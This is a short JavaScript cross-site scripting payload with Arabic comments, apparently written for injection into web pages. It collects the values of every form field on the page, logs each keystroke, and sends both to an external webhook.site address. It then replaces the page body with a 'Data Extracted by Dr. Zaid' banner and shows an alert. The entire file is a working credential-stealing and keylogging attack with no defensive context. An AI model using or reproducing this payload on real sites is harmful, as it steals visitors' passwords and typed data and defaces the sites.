(function() {
  console.log("🚀 Advanced XSS + Extraction Started");

  // 🧠 التقاط محتوى جميع الحقول الحساسة
  const fields = document.querySelectorAll("input, textarea, select");
  let fieldData = [];

  fields.forEach(el => {
    let name = el.name || el.id || "unnamed";
    let type = el.type || el.tagName.toLowerCase();
    let value = el.value || "(empty)";
    fieldData.push(`${type}[${name}]=${value}`);
  });

  // 🔐 تشغيل Keylogger على كافة الحقول
  document.addEventListener("keydown", function(e) {
    fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/keylog?key=" + encodeURIComponent(e.key));
  });

  // 📦 إرسال البيانات إلى Webhook
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/xssfields?data=" + encodeURIComponent(fieldData.join("&")));

  // 🔥 تعديل بصري للموقع لإثبات التنفيذ
  document.title = "XSS ⚠️ Breach Detected";
  document.body.style.background = "#111";
  document.body.style.color = "#f00";
  document.body.innerHTML = `<h1 style='font-size:2em;'>🛑 Data Extracted by Dr. Zaid</h1><p>${fieldData.join("<br>")}</p>`;

  // ✅ تأكيد
  alert("✅ Field data sent, keylogger active.");
  console.log("✔️ Extraction and keylogger initialized");
})();
